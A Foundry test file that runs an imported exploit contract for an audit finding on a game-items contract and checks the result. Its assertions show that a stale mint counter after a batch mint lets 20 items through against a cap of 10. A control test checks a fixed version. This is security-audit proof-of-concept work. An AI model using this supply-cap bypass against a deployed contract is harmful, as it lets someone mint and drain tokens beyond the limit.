// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Exploit, GameItems, MockToken} from "./53284-h-01-not-updating-mint-count-cid-and-burn-count-cid-pashov-a.sol";

contract GigaverseMintCountTest is Test {
    function test_exploit_stale_mint_count_lets_a_second_cap_through() public {
        Exploit e = new Exploit();
        e.run();

        uint256 held = e.items().balanceOf(e.ID(), address(e));
        uint256 counted = e.items().minted(e.ID());
        uint256 tokens = e.item().balanceOf(address(e));
        console.log("items held", held);
        console.log("MINT_COUNT after the later mint", counted);
        console.log("maxSupply", e.items().maxSupply(e.ID()));
        console.log("stale count right after mintBatch", e.staleCount());
        assertEq(e.staleCount(), 0, "mintBatch left MINT_COUNT at 0");
        assertEq(held, 20, "20 items minted against a cap of 10");
        assertEq(tokens, 20, "20 item tokens paid out");
        assertEq(counted, 10, "only the single mint updated the counter");
        assertEq(e.items().maxSupply(e.ID()), 10, "cap is 10");
    }

    function test_control_fixed_batch_updates_the_counter_and_blocks_the_extra_mint() public {
        MockToken item = new MockToken("ITEM", "ITEM", 0);
        GameItems items = new GameItems(address(this), item);
        items.setMaxSupply(1, 10);
        uint256[] memory ids = new uint256[](1);
        uint256[] memory amounts = new uint256[](1);
        ids[0] = 1;
        amounts[0] = 10;
        items.mintBatchFixed(address(this), ids, amounts);
        assertEq(items.minted(1), 10, "fixed batch writes MINT_COUNT");
        assertEq(items.balanceOf(1, address(this)), 10, "fixed batch mints the cap");
        vm.expectRevert(abi.encodeWithSelector(GameItems.NotEnoughSupply.selector, 11, 10));
        items.mint(address(this), 1, 1);
        assertEq(item.balanceOf(address(this)), 10, "no eleventh item is paid");
    }
}
